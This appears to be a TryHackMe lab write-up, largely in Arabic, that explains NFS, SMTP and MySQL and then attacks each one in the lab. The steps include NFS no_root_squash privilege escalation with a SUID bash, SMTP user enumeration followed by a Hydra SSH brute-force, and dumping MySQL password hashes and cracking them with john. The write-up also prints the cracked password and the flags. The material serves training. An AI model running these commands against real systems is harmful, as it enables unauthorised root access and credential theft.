# Network Services_2

<details>
  <summary>NFS</summary>

<details>
  <summary>understanding</summary>

# 🧠 ما هو NFS؟

**NFS** هو بروتوكول يسمح لجهاز بمشاركة ملفات أو فولدرات مع جهاز آخر على نفس الشبكة.
على سبيل المثال، إذا كان لديك سيرفر يحتوي على ملفات، يمكنك من جهاز آخر "تركيب" (mount) هذا الفولدر ورؤية الملفات وكأنها موجودة على جهازك.

---

# 🛠️ كيف يعمل NFS؟

1. **العميل (Client)** يطلب تركيب (mount) فولدر من السيرفر.
2. **السيرفر** يتحقق مما إذا كان العميل يملك صلاحيات.
3. إذا كانت الصلاحيات صحيحة، يقوم السيرفر بإرسال **file handle**.
4. عندما يطلب العميل فتح ملف، يرسل **RPC (Remote Procedure Call)** إلى **NFSD** (خدمة NFS على السيرفر).

### يتضمن الطلب:

* File Handle
* اسم الملف
* User ID و Group ID (لتحديد الصلاحيات)

بعدها يقرر السيرفر ما إذا كان هذا المستخدم يملك صلاحية القراءة أو الكتابة على الملف.

---

# 💻 من يمكنه استخدام NFS؟

يدعم NFS أنظمة تشغيل مختلفة، مثل:

* Linux (لينكس)
* Windows (ويندوز – خاصة Windows Server)
* macOS (ماك)
* UNIX (يونيكس)

مما يسمح بنقل الملفات بين الأنظمة بسهولة وبدون مشاكل.

---

# 📚 مصادر للتعمق:

* [Oracle Docs](https://docs.oracle.com/...)
* [Datto](https://www.datto.com/...)
* [Arch Wiki](https://wiki.archlinux.org/...)

---

# 🎯 NFS في مجال الهاكينج

في اختبارات الاختراق (مثل CTFs)، قد تجد أن السيرفر يشارك مجلدات عبر NFS، وغالبًا ما يكون الإعداد ضعيف الأمان:

* يمكنك العثور على ملفات تحتوي على كلمات مرور.
* أو تركيب المجلد بصلاحيات أعلى من المفترض.
* أو حتى الكتابة على السيرفر، مما قد يؤدي إلى:

  * **Privilege Escalation** (تصعيد الصلاحيات)
  * **Persistence** (الاحتفاظ بالوصول)

  
</details>
---
<details>
  <summary>enumerating</summary>


# 🗂️ NFS Enumeration — TryHackMe

## 💥 ما هي Enumeration؟

**Enumeration** هي المرحلة اللي بتبدأ فيها تتفاعل مع الهدف بعد ما تعرف أنه شغال. هدفها جمع أكبر قدر من المعلومات مثل:
- البورتات المفتوحة
- الخدمات الشغالة
- الملفات أو الصلاحيات المتاحة
- المشاركة عبر الشبكة (مثل NFS)

---

## 🛠️ الأدوات المطلوبة: nfs-common

### 📦 لتثبيت الأداة:
```bash
sudo apt update && sudo apt install nfs-common -y
```

### أهم الأدوات داخل `nfs-common`:
- `showmount` → لمعرفة الـ shares المتاحة.
- `mount` → لتركيب الـ NFS share على جهازك.

---

## 🔍 فحص البورتات (Port Scanning)

استخدم `nmap` لاكتشاف البورتات والخدمات، خصوصًا NFS (عادةً على بورت 2049):

```bash
nmap -A -p- 10.10.x.x
```

- `-A` → تشغيل الكشف عن النظام والخدمات
- `-p-` → فحص كل البورتات (1 إلى 65535)

---

## 📂 تركيب (Mount) NFS Share

### 1️⃣ إنشاء مجلد محلي:
```bash
mkdir /tmp/mount
```

### 2️⃣ تركيب الـ NFS Share:
```bash
sudo mount -t nfs <IP>:<share> /tmp/mount/ -nolock
```

#### مثال:
```bash
sudo mount -t nfs 10.10.254.46:/shared /tmp/mount/ -nolock
```

---

### 💬 شرح الأمر:

| الجزء               | معناه                                                      |
|---------------------|-------------------------------------------------------------|
| `sudo`              | تشغيل الأمر كـ root                                         |
| `mount`             | أمر تركيب الملفات                                           |
| `-t nfs`            | تحديد أن النوع NFS                                          |
| `IP:share`          | عنوان السيرفر ومسار المشاركة                                |
| `/tmp/mount/`       | المكان اللي هيظهر فيه الشير عندك                            |
| `-nolock`           | تجاوز مشاكل locking (مفيد في CTF)                          |

---

## 🧠 الخلاصة

- Enumeration هي خطوة أساسية قبل الهجوم.
- NFS يسمح بمشاركة ملفات عبر الشبكة.
- استخدم `showmount` و `mount` لتصفح وسحب الملفات.



---


```
nmap -A -p- 10.10.58.68
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 18:00 EDT
Stats: 0:01:53 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 52.26% done; ETC: 18:03 (0:01:43 remaining)
Nmap scan report for 10.10.58.68
Host is up (0.089s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 89:ce:8b:ba:18:15:4e:df:4a:72:ff:fa:f5:79:fa:07 (RSA)
|   256 11:34:2c:a1:57:23:ad:dd:d3:87:ca:46:64:55:10:fc (ECDSA)
|_  256 40:ae:b7:7d:8a:88:75:b1:64:e6:80:d3:6a:d2:a0:f9 (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34617/udp6  mountd
|   100005  1,2,3      41543/tcp6  mountd
|   100005  1,2,3      47131/udp   mountd
|   100005  1,2,3      55605/tcp   mountd
|   100021  1,3,4      37739/tcp   nlockmgr
|   100021  1,3,4      44665/tcp6  nlockmgr
|   100021  1,3,4      55473/udp6  nlockmgr
|   100021  1,3,4      58643/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
37739/tcp open  nlockmgr 1-4 (RPC #100021)
42227/tcp open  mountd   1-3 (RPC #100005)
51739/tcp open  mountd   1-3 (RPC #100005)
55605/tcp open  mountd   1-3 (RPC #100005)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   86.46 ms 10.8.0.1
2   88.57 ms 10.10.58.68

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 269.36 seconds

```

---

```
/usr/sbin/showmount -e 10.10.58.68
```

![image](https://github.com/user-attachments/assets/48c71fcb-0ecd-42db-a5fa-6d80aa6a09c0)

---

```
mkdir /tmp/mount
sudo mount -t nfs 10.10.58.68:/home /tmp/mount/ -nolock
```

![image](https://github.com/user-attachments/assets/b05502a0-f46b-462b-9b34-5ad2f3002891)

---
![image](https://github.com/user-attachments/assets/84239b60-0a24-493b-81f9-3aadfd463125)


![image](https://github.com/user-attachments/assets/806ef472-f80d-4c63-85bd-46a34dee8518)






```
ssh -i id_rsa cappucino@10.10.58.68
```

![image](https://github.com/user-attachments/assets/dc237cc6-0734-49e3-8769-633bd86245af)









  
</details>
---
<details>
  <summary>exploiting</summary>



# 🚀 NFS Privilege Escalation via Root Squash Misconfiguration

## 🧠 ما هو Root Squash؟

`root_squash` هو إعداد في NFS يمنع المستخدمين اللي يدخلوا من أجهزة خارجية من استخدام صلاحيات root.

- ✅ إذا كان **مُفعل**: أي اتصال من مستخدم root → يتحول تلقائيًا إلى مستخدم `nfsnobody`
- ❌ إذا كان **غير مُفعل** (misconfigured): يسمح للمستخدم يرفع ملفات ويعطيها صلاحيات root، وده خطر جدًا!

---

## 🔐 ما هو SUID؟

**SUID (Set User ID)**: لما يكون ملف تنفيذي عليه SUID، أي حد يشغله بيشتغل بنفس صلاحيات صاحب الملف (مثل root).

### مثال:
```bash
chmod +s bash
ls -l bash
# -rwsr-xr-x 1 root root 1183448 Jun  5 13:15 bash
```

هنا `s` معناها SUID مفعّل.

---

## 🧨 الهجوم خطوة بخطوة:

### ✅ الخطوة 1: نزل ملف bash من جهاز الضحية

لو عندك key لل SSH:
```bash
scp -i id_rsa username@10.10.58.68:/bin/bash ~/Downloads/bash
```

أو تقدر تحمله من الإنترنت (إذا مشيت معاك):
```bash
wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
chmod +x bash
```

---

### ✅ الخطوة 2: ارفع bash إلى الـ NFS Share

افترض إنك عملت mount للـ NFS في `/mnt/nfs`:
```bash
cp bash /mnt/nfs/bash
```

---

### ✅ الخطوة 3: عيّن صلاحيات SUID

```bash
chmod +s /mnt/nfs/bash
ls -l /mnt/nfs/bash
# -rwsr-xr-x 1 root root ... bash
```

---

### ✅ الخطوة 4: اتصل بالجهاز عبر SSH

```bash
ssh -i id_rsa username@10.10.58.68
```

---

### ✅ الخطوة 5: شغّل الباش اللي عليه SUID بصلاحيات root

```bash
/mnt/nfs/bash -p
```

💥 وهتلاحظ إنك بقيت root:

```bash
whoami
# root
```

---

## 🔁 الخلاصة: مسار التصعيد الكامل

```text
NFS Access
    ↓
Low Privilege Shell
    ↓
Upload Bash Executable to the NFS Share
    ↓
Set SUID Bit via NFS
    ↓
Login via SSH
    ↓
Execute Bash with -p
    ↓
🎯 Root Access Achieved
```

---

## 📌 ملاحظات مهمة:

- تأكد من أن المجلد في NFS mounted عندك.
- تأكد من صلاحيات الـ share (إنه بيقبل SUID).
- استخدم `bash -p` دايمًا لتشغيل shell بـ privileges.





----

```
cat /etc/exports
```

![image](https://github.com/user-attachments/assets/c57c6be9-b09b-4569-97ed-7fb7e7db9e1e)

found ``/home           *(rw,no_root_squash)``


----

```
scp -i id_rsa username@10.10.58.68:/bin/bash ~/Downloads/bash
```

```
sudo cp ~/Downloads/bash /tmp/mount/bash
```

```
sudo chmod +s /tmp/mount/bash
```

![image](https://github.com/user-attachments/assets/41d82a35-4ba7-4415-9cff-118f76b08141)


```
ssh -i id_rsa cappucino@10.10.58.68
```

now run ``bash`` file :


![image](https://github.com/user-attachments/assets/ff131676-ca3a-4bd1-9584-cdfb7b2ff56d)


```
THM{nfs_got_pwned}
```

# الخلاصه 

1. إحنا ركّبنا مجلد من السيرفر عن طريق الـ NFS.
2. في السيرفر ده، إعداد الـ NFS مش مفعل root_squash.
3. يعني لو أنا من جهازي رفعت ملف لمجلد الـ NFS وملّكته للـ root → السيرفر هيحترم ده!
4. فإحنا:
5. نسخنا نسخة من bash
6. حطيناها في /tmp/mount/bash
7. وفعّلنا عليها SUID
8. لما نرجع نسجل دخول عادي على السيرفر:
9. ونجرب نشغّل /tmp/mount/bash -p
10. هيشتغل كأننا root!









  
</details>


</details>

-------------------------------------------------------------------------------------------------------------------------------------------

<details>
  <summary>SMTP</summary>

<details>
  <summary>understanding</summary>



# 📧 What is SMTP?

## 🔹 تعريف SMTP

**SMTP** اختصار لـ **Simple Mail Transfer Protocol**، وهو البروتوكول المسؤول عن **إرسال الرسائل الإلكترونية (Emails)** بين السيرفرات.

> تخيل إنك بتبعت رسالة بالبريد، SMTP هو ساعي البريد اللي بياخد الرسالة ويوصلها للسيرفر الخاص بالمستلم.

---

## 🔸 لماذا نحتاج SMTP و POP/IMAP معًا؟

- **SMTP**: لإرسال الرسائل 📤
- **POP/IMAP**: لاستلام الرسائل 📥

> عند إعداد إيميل جديد في برنامج مثل Outlook أو Thunderbird، نحتاج إعداد:
- SMTP (للإرسال)
- IMAP أو POP (للاستلام)

---

## 🔸 وظائف سيرفر SMTP

1. التحقق من هوية الراسل.
2. إرسال الرسالة إلى السيرفر المستلم.
3. إعادة رسالة خطأ إذا لم يتم التوصيل.

---

## 🔸 الفرق بين POP و IMAP

| العنصر | POP | IMAP |
|--------|-----|------|
| الاسم | Post Office Protocol | Internet Message Access Protocol |
| الوظيفة | تحميل الرسائل من السيرفر للجهاز | مزامنة الرسائل بين السيرفر وكل الأجهزة |
| العيب | قد تُحذف الرسائل من السيرفر | تبقى الرسائل على السيرفر |
| الأفضلية | لجهاز واحد | لأجهزة متعددة |

---

## 🔸 كيف يعمل SMTP؟

### 📤 خطوات إرسال الإيميل:

1. برنامج الإيميل يتصل بسيرفر SMTP (مثل smtp.gmail.com) عبر بورت 25.
2. يرسل العناوين، نص الإيميل، والمرفقات.
3. السيرفر يتحقق من الدومين.
4. إن لم يكن نفس الدومين، يتم الاتصال بسيرفر المستلم.
5. لو السيرفر غير متاح → يدخل الإيميل قائمة الانتظار.
6. السيرفر المستقبل يتحقق ويرسل الرسالة إلى POP/IMAP.
7. الإيميل يظهر في Inbox المستلم.

---

## 🔸 مثال عملي

كتبت إيميل في Gmail وضغطت Send:
- Gmail يستخدم SMTP لإرساله لسيرفر المستلم.
- المستلم يستخدم IMAP/POP لاستلامه.

---

## 🔸 البرامج التي تدعم SMTP

- **Windows Server** يحتوي على SMTP مدمج.
- **Linux** يدعم برامج مثل:
  - Postfix
  - Sendmail
  - Exim

---

## 🔗 مصادر للتوسع

- [HowStuffWorks: شرح مبسط](https://computer.howstuffworks.com/e-mail-messaging/email3.htm)
- [AfterNerd: شرح تقني أعمق](https://www.afternerd.com/blog/smtp/)


---

![image](https://github.com/user-attachments/assets/6cd824ef-02f9-4e20-8abe-8f5b3b94076e)



  
</details>
---
<details>
  <summary>enumerating</summary>

# 📧 SMTP Enumeration Guide

## 💡 الفكرة العامة

أنت دلوقتي هتشتغل على سيرفر SMTP (سيرفر إرسال بريد)، وغرضك تعمل Enumeration علشان:

- تعرف معلومات عن السيرفر (النوع والإصدار)
- تستخرج أسماء المستخدمين اللي على السيرفر (User Enumeration)

وده بيساعدك كخطوة أولى لاختراق شبكة.

---

## 🔧 قبل ما نبدأ

- شغل المعمل (Deploy the room) من المنصة اللي شغال عليها.
- استنى شوية لحد ما السيرفر يكون جاهز (غالبًا بياخد 3-5 دقايق).
- تأكد إنك شغال على Kali Linux أو Parrot OS (فيهم Metasploit جاهز).

---

## 🕵️‍♂️ مرحلة 1: تحديد نوع السيرفر (Fingerprinting)

### أداة: `smtp_version` من Metasploit

- الوظيفة: بتحدد نوع ونسخة سيرفر الـSMTP.
- مفيدة علشان تعرف هل فيه ثغرات معروفة للسيرفر ده.

### الخطوات:

```bash
msfconsole
use auxiliary/scanner/smtp/smtp_version
set RHOSTS [IP]
run
```


## 👥 مرحلة 2: استكشاف المستخدمين (User Enumeration)
طريقتين:
* يدوي (بـ Telnet)

* تلقائي (بـ Metasploit أو أدوات خارجية)



---

### ✋ يدويًا (عن طريق Telnet)
اتصل بسيرفر SMTP:
```
telnet [IP] 25
```

استخدم أوامر مثل:

```
VRFY username
EXPN listname
RCPT TO:<username@target.com>
```

### 🤖 تلقائيًا باستخدام Metasploit (smtp_enum)
وظيفة الموديول:

* يجرب لستة يوزرات (wordlist) على السيرفر.

* يستخدم أوامر SMTP زي VRFY و RCPT TO.

* بيردلك بمين موجود ومين لأ.

```
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS [IP]
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
run
```


## 🧰 بدائل لـ Metasploit
لو مش عايز تستخدم Metasploit (مثلاً بتحضر لـ OSCP)، فيه أداة اسمها:


### 🔸 smtp-user-enum

التثبيت:

```
sudo apt install smtp-user-enum
```

الاستخدام:

```
smtp-user-enum -M VRFY -U users.txt -t [IP]
```

تقدر تغير ``-M`` لـ:

* ``VRFY`` → لتأكيد اسم المستخدم

* ``EXPN`` → لإظهار أعضاء mailing lists

* ``RCPT`` → لمحاولة إرسال رسالة للعنوان



### ✅ خلاصة



| الخطوة                      | الأدوات                                   |
| --------------------------- | ----------------------------------------- |
| معرفة إصدار السيرفر         | Metasploit (smtp\_version)                |
| استكشاف المستخدمين يدويًا   | Telnet + أوامر VRFY/EXPN/RCPT             |
| استكشاف المستخدمين تلقائيًا | Metasploit (smtp\_enum) أو smtp-user-enum |








-----

```
nmap -sCV 10.10.152.44 
```
```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-06 10:14 EDT
Nmap scan report for 10.10.152.44
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f0:d6:e6:02:ac:4b:ce:1f:16:b0:c0:94:3c:8e:5b:e4 (RSA)
|   256 2a:a4:78:e2:16:2b:59:1a:3a:ac:28:d9:0d:76:39:ab (ECDSA)
|_  256 0f:70:81:e2:0b:1a:12:69:1b:ef:9b:ec:d4:00:7b:4f (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: polosmtp.home, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| ssl-cert: Subject: commonName=polosmtp
| Subject Alternative Name: DNS:polosmtp
| Not valid before: 2020-04-22T18:38:06
|_Not valid after:  2030-04-20T18:38:06
|_ssl-date: TLS randomness does not represent time
Service Info: Host:  polosmtp.home; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.86 seconds

```

---

```
msfconsole
search smtp_version
```
```
auxiliary/scanner/smtp/smtp_version
```

after that :

```
use 0
show options
```
![image](https://github.com/user-attachments/assets/e01f6429-5c7a-4cf5-91a8-5339f25b5840)


```
set RHOSTS 10.10.152.44
```
```
run
```

![image](https://github.com/user-attachments/assets/622b5770-35b9-41c7-a0fd-e0169f225752)


![image](https://github.com/user-attachments/assets/7bb1ce01-64b0-4e82-8e56-db1e248fc5b5)

```
search smtp_enum
```

``found``

```
auxiliary/scanner/smtp/smtp_enum
```

```
use 0
```

```
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

![image](https://github.com/user-attachments/assets/41a3e00f-1838-4ff9-8993-d402a1afdcfc)


```
run
```

![image](https://github.com/user-attachments/assets/f186a255-228c-4060-8613-5709a3176ee1)

```
administrator
```



  
</details>
---
<details>
  <summary>exploiting</summary>


# 🔐 SSH Brute-Force using Hydra

## 💡 What Do We Know?
From previous enumeration steps, we have discovered:
- ✅ A valid **username**
- ✅ The SMTP server is **Postfix** on **Ubuntu**
- ✅ The only other open port is **SSH (port 22)**

Now we'll use this information to try to **brute-force the SSH password** for the discovered user using **Hydra**.

---

## ⚙️ Preparation Steps

- Exit Metasploit (`exit` command).
- Ensure you have the Hydra tool (comes pre-installed on Kali/Parrot OS).
- Make note of the:
  - Target IP (e.g., `10.10.152.44`)
  - Valid username
  - Path to your password wordlist

---

## 🛠️ Hydra Command Syntax

```
hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.152.44 ssh
```

### 📌 Command Breakdown

| Option                  | Description                                                  |
|-------------------------|--------------------------------------------------------------|
| `hydra`                 | Runs the Hydra tool                                          |
| `-t 16`                 | Number of parallel threads (increases speed)                |
| `-l [USERNAME]`         | The username you're trying to crack                         |
| `-P [wordlist_path]`    | Path to the password dictionary file                        |
| `-vV`                   | Very verbose output (prints every attempt)                  |
| `[TARGET_IP]`           | IP address of the target machine                            |
| `ssh`                   | The protocol to brute-force                                 |

---




----

```
hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.152.44 ssh
```

![image](https://github.com/user-attachments/assets/ea5bf18a-49e6-4834-ae0a-ec002d750ab0)

```
alejandro
```

now login using ssh 

```
ssh administrator@10.10.152.44
```

![image](https://github.com/user-attachments/assets/f4d37c42-df6b-4620-b602-4e97ac2f4f10)

```
THM{who_knew_email_servers_were_c00l?}
```
  
</details>


</details>

-------------------------------------------------------------------------------------------------------------------------------------------

<details>
  <summary>MYsql</summary>

<details>
  <summary>understanding</summary>


# 📚 Introduction to MySQL

## 🔍 What is MySQL?
MySQL is a **Relational Database Management System (RDBMS)** that uses **SQL (Structured Query Language)** to store and manipulate data.

---

## 📦 Key Concepts

### 🗂️ Database
A structured and persistent collection of data. Example: storing users, orders, and products for a website.

### 🧠 RDBMS (Relational Database Management System)
Manages databases in **table format**, where:
- **Primary Key**: Uniquely identifies each row in a table.
- **Foreign Key**: Links data between tables.

### 📝 SQL (Structured Query Language)
Language used to interact with databases. Examples:
- `SELECT`: Fetch data
- `INSERT`: Add data
- `UPDATE`: Modify data
- `DELETE`: Remove data

---

## ⚙️ How MySQL Works

1. **Server**: Handles all data operations.
2. **Client**: Sends SQL commands to the server (e.g., PHP script).
3. **Communication**: Happens via SQL queries.

### Process Flow:
- Create the database
- Define tables and relationships
- Client sends SQL queries
- Server processes and returns results

---

## 🖥️ Platforms

MySQL works on:
- Linux
- Windows
- macOS

It's widely used in web development and forms a core part of the **LAMP stack**:
- **L**inux
- **A**pache
- **M**ySQL
- **P**HP/Python

---

## 🎓 More Resources

- [MySQL SQL Execution Internals](https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html)
- [W3Schools - PHP + MySQL](https://www.w3schools.com/php/php_mysql_intro.asp)

---

## 🧠 Summary

| Concept   | Description |
|-----------|-------------|
| MySQL     | System to manage relational databases |
| SQL       | Language for communicating with databases |
| RDBMS     | Organizes data into related tables |
| Server & Client | Server stores and processes data; client sends requests |


---

![image](https://github.com/user-attachments/assets/c845c6aa-7834-408c-981e-947a420bf240)




  
</details>
---
<details>
  <summary>enumerating</summary>


# 🚀 Starting MySQL Enumeration & Exploitation

## ✅ Before You Begin
- Deploy the room on TryHackMe.
- Wait 3–5 minutes for the target VM to boot.
- Make sure you have:
  - MySQL Client
  - Metasploit (default on Kali/Parrot)

## 🧠 When Do You Attack MySQL?
MySQL is **not usually the first target** in real scenarios.  
But if you discover credentials (e.g., from a subdomain), **try them against MySQL**.

---

## 🎭 Scenario (from this room)
You found credentials:
```
Username: root
Password: password
```
- Tried SSH: ❌ Failed  
- Tried MySQL: ✅ This is where it works

---

## 🛠️ Requirements

### Install MySQL client (if not already installed):
```bash
sudo apt install default-mysql-client
```

### Connect to MySQL:
```bash
mysql -h 10.10.152.111 -u root -p
```

### If SSL error occurs:
```bash
mysql -h 10.10.152.111 --ssl-mode=DISABLED -u root -p
```

---

## 💣 Using Metasploit
- Great for automated MySQL enumeration.
- Easy to use with modules like `mysql_login` and `mysql_enum`.

### But! Try to **understand the process** behind the modules.

---

## 🧰 Alternatives to Metasploit

### 🔹 Nmap Script for MySQL
```bash
nmap -p 3306 --script mysql-enum <target-ip>
```

### 🔹 Exploit-DB Script
[Exploit 23081 - MySQL Enumeration](https://www.exploit-db.com/exploits/23081)

---

## 🎯 Final Goal
- Connect to MySQL using found credentials.
- Enumerate the service (users, databases, privileges).
- Understand what Metasploit does under the hood.
- Try manually later to build deeper understanding.

---

**Now you’re ready — jump in and break into MySQL! 🔥**



----

```
nmap -sCV 10.10.152.111
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-06 12:34 EDT
Nmap scan report for 10.10.152.111
Host is up (0.096s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fd:7c:26:3c:b6:33:4b:dc:28:c8:3c:c8:64:f6:c9:f5 (RSA)
|   256 ae:df:e4:25:cc:be:68:0c:c1:44:17:45:d1:d0:2c:3d (ECDSA)
|_  256 9a:6b:fb:20:50:85:7f:bd:67:88:c7:45:83:1a:1b:b0 (ED25519)
3306/tcp open  mysql   MySQL 8.0.42-0ubuntu0.20.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.42-0ubuntu0.20.04.1
|   Thread ID: 9
|   Capabilities flags: 65535
|   Some Capabilities: ConnectWithDatabase, Support41Auth, Speaks41ProtocolOld, SupportsCompression, ODBCClient, SupportsTransactions, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, SwitchToSSLAfterHandshake, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, LongPassword, LongColumnFlag, SupportsLoadDataLocal, FoundRows, InteractiveClient, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: t\x13z\x0C'v#i\x1CZ\x12\x02
| B\#q\x113Q
|_  Auth Plugin Name: caching_sha2_password
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_5.7.29_Auto_Generated_Server_Certificate
| Not valid before: 2020-04-23T10:13:27
|_Not valid after:  2030-04-21T10:13:27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.75 seconds
```

---

``root : password``

```
mysql --ssl=0 -h 10.10.152.111 -u root -p
```

![image](https://github.com/user-attachments/assets/05e0b9e6-3f34-4efd-96df-4db9a9fa5bb7)

use ``mysql`` database and show tabels

![image](https://github.com/user-attachments/assets/9b27eddf-05b6-4b79-87f9-a337d6ed299d)


```
exit
```

now using metasploit

```
mfsconsole
```
```
search mysql_sql
use 0
```

![image](https://github.com/user-attachments/assets/39c5c57d-8fc2-4b5c-bf22-cd4e4adb4d95)

```
set username root
set password password
set rhosts 10.10.152.111
run
```

![image](https://github.com/user-attachments/assets/279b1767-8131-444e-8bdd-475c227e72b2)


```
set SQL show databases
```


![image](https://github.com/user-attachments/assets/31ed13bf-b4c3-4a57-b224-167d07dbe483)


  
</details>
---
<details>
  <summary>exploiting</summary>

# شرح عن الـ Hashes في MySQL وأهميتها

## 🧠 المفاهيم الأساسية

### 1. ما هو الـ Hash؟
الـ Hash هو ناتج تشفير لمعلومة، زي كلمة السر، بيحولها لسلسلة من الأحرف والأرقام بطول ثابت.  
الميزة إنه من الصعب ترجعه للنص الأصلي.

### 2. استخدام الـ Hash في MySQL
- تخزين كلمات السر مش كنص عادي، بل كـ Hash  
- استخدام الـ Hash في فهرسة البيانات أو التحقق من صحة المعلومات.

---

## 🎯 الهدف من استخراج الـ Hashes

- الحصول على كلمات سر مشفرة للمستخدمين  
- محاولة كسر هذه الـ Hashes (باستخدام أدوات زي hashcat أو john)  
- محاولة الدخول بحسابات المستخدمين على خدمات تانية (SSH، FTP، الخ)

---

## 🚀 خطوات العمل

1. البحث عن جداول مستخدمين محتملة:  
    أمثلة: users, login, accounts

2. استعراض الحقول داخل الجدول:  
    خصوصًا اللي بتحتوي على username, password, hash

3. استخراج الـ hashes واستخدام أدوات الكسر عليها.

---

## مثال أوامر SQL:

```sql
SHOW DATABASES;

USE users_database;

SHOW TABLES;

SELECT username, password FROM users;

```



---
---

``on metasploit``

```
search mysql_schemadump
```


![image](https://github.com/user-attachments/assets/45f89bc1-b1cc-4b8f-8f92-77fe7d5eae32)


```
run
```
![image](https://github.com/user-attachments/assets/f05fc82b-7c69-49ac-a38f-07c6ce81d517)

```
x$waits_global_by_latency
```

```
search mysql_hashdump
```

![image](https://github.com/user-attachments/assets/ba7bde52-5fbd-49b0-9c51-12033ace20f3)


```
set username root
set password password
set rhosts 10.10.152.111
run
```

![image](https://github.com/user-attachments/assets/f9201589-c795-42e8-ad02-9b70d48fcc76)


```
nano mysql_hash
```
```
carl:*EA031893AA21444B170FC2162A56978B8CEECE18
```

```
john mysql_hash 
```

![image](https://github.com/user-attachments/assets/bc20aa32-9f37-4917-8f39-e4f4bfe3d386)

now login using ``ssh``

```
ssh carl@10.10.152.111
```

![image](https://github.com/user-attachments/assets/77b0e39a-1a18-4459-97dd-b7a22a53a246)


```
THM{congratulations_you_got_the_mySQL_flag}
```

  
</details>


</details>

-------------------------------------------------------------------------------------------------------------------------------------------
